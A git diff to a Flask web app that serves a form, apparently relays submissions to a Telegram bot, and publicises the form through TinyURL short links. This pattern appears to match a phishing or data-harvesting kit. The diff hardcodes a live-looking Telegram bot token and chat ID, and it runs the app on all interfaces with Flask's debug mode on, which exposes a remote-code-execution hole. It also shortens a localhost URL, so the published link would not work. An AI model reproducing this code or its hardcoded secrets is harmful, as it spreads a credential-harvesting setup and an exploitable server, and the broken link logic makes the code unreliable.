@@ -1,12 +1,14 @@
 import os
 from flask import Flask, request, jsonify, redirect, render_template_string
+import socket
 import requests
 
 app = Flask(__name__)
 
 # Telegram Bot Configurations
 TELEGRAM_BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
-TELEGRAM_CHAT_ID = "6904067155" # আপনার টেলিগ্রাম চ্যাট আইডি দিন
+TELEGRAM_CHAT_ID = "6904067155"  # আপনার টেলিগ্রাম চ্যাট আইডি দিন
+
 # TinyURL API for Short Link Generation
 def generate_short_link(long_url):
     response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}")
@@ -52,6 +54,9 @@ html_template = """
             margin-bottom: 15px;
             border: 1px solid #dddddd;
             border-radius: 5px;
+        }
+        input:invalid {
+            border-color: red;
         }
         button {
             width: 100%;
@@ -184,14 +189,14 @@ def submit():
 
     return render_template_string(success_template)
 
-@app.route("/generate_short_link", methods=["GET"])
-def generate_link():
-    original_link = request.args.get("link")
-    if not original_link:
-        return jsonify({"error": "No link provided"}), 400
-
-    short_link = generate_short_link(original_link)
-    return jsonify({"short_link": short_link})
+def find_free_port():
+    """Finds a free port to use."""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind(("", 0))
+        return s.getsockname()[1]
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    port = find_free_port()
+    short_link = generate_short_link(f"http://127.0.0.1:{port}/form")
+    print(f"Form is available at: {short_link}")
+    app.run(host="0.0.0.0", port=port, debug=True)
